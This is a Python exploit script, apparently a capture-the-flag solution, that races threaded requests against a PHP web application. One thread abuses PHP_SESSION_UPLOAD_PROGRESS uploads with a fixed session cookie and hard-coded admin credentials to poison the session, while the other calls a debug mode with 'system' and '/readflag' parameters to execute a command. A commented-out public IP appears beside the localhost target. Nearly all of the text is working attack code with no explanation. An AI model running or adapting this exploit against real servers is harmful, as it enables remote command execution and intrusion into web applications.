import urllib.parse
import requests 
import urllib
from threading import Thread

# url = "http://52.231.139.134" 
url = "http://localhost:5555"

def go1(): 
    while True:
        r = requests.post(
            f"{url}/admin_login.php",
            data={
                "username": "admin",
                "password": "superSecretAdminPassword!@#12",
                "PHP_SESSION_UPLOAD_PROGRESS": "test|"
            },
            cookies={ 
                "username": "A" * 1000,
                "password": "A" * 1000,
                "PHP_SESSION_UPLOAD_PROGRESS": "A" * 1000,
                "PHPSESSID": "orange"
            },
            files={"file": ("simple.txt", b"ccl" * 40960)}
        )
        if not "Incorrect Password" in r.text:
            if not "Smart admins never enter the wrong password :p" in r.text:
                if "99999" in r.text: 
                    print(end='admin')

def go2():
    while True: 
        r = requests.get(
            f"{url}/?mode=debug_mode&debug[]=system&debug[]=%2Freadflag",
            cookies={
                "PHPSESSID": "orange",
                "mode": "A" * 1000,
                "debug": "A" * 1000,
            }
        )
        if "99999" in r.text: 
            print(r.text) 
            exit(0)

for _ in range(10):
    thr1 = Thread(target=go1) 
    thr2 = Thread(target=go2) 

    thr1.start()
    thr2.start() 
